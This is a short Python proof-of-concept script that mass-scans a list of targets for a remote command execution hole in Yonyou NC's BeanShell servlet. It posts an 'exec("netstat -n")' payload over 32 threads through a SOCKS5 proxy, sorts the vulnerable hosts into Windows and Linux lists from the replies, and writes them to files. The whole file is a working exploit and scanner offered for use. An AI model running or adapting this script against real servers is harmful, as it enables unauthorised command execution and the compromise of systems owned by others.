# YONYOU NC POC BY SUCKER
import requests, socket, socks, urllib.parse
from time import sleep
from concurrent.futures import ThreadPoolExecutor, wait

# config proxy
socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 10808)
socket.socket = socks.socksocket

# request headers
header = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0'
}

# payload for detect
payload = urllib.parse.urlencode({'bsh.script': 'exec("netstat -n");'})

# files
target = './targets.txt'
res_windows = './windows.txt'
res_linux = './linux.txt'


# judge os
def osJudgement (res):
    if 'Source file: inline evaluation' in res:
        return 'none'
    else:
        os = 'windows'
        if 'unix' in res:
            os = 'linux'
        return os

# post payload
def check(url, header, payload):
    try:
        res = requests.post(url, data=payload, headers=header, timeout=10)
        if res.status_code != 200:
            return (url, 'none')
        return (url, osJudgement(res.text))
    
    except Exception as e:
        return (url, 'none')


if __name__ == '__main__':

    windows, linux, targets, poolList = [[], [], [], []]
    # set max threads
    pool = ThreadPoolExecutor(max_workers=32)
    
    with open(target, 'r') as f:
        targets += f.read().split('\n')
    
    for i in targets:
        url = i + '/servlet/~ic/bsh.servlet.BshServlet'
        poolList.append(pool.submit(lambda p: check(*p), [url, header, payload]))
    
    # wait all threads done
    wait(poolList)
    for i in poolList:
        if i.result()[1] != 'none':
            if i.result()[1] == 'windows':
                windows.append(i.result()[0])
            else:
                linux.append(i.result()[0])
    
    # write into file
    with open(res_windows, 'w') as f:
        for i in windows:
            f.write(i + '\n')
    
    with open(res_linux, 'w') as f:
        for i in linux:
            f.write(i + '\n')
    
